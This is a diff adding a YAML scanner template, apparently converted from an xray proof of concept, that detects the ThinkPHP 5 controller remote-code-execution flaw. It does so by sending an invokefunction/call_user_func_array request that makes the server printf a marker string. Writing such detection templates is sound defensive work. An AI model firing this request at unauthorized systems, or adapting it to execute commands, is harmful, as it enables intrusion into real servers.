@@ -1,0 +1,25 @@
+# 来源: xray（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: word
+        part: body
+        words:
+          - a29hbHIgaXMg%d2F0Y2hpbmcgeW9129
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=a29hbHIgaXMg%25%25d2F0Y2hpbmcgeW91'
+id: thinkphp5-controller-rce
+info:
+  author: argus-import
+  description: ""
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: 在符合以下条件的情况下，我们欢迎任何人以任何形式使用本项目（包括商用）。
+    argus-import-source: xray
+    argus-risk-level: medium
+  name: thinkphp5-controller-rce
+  reference:
+    - https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce
+  severity: medium
+  tags: argus-import
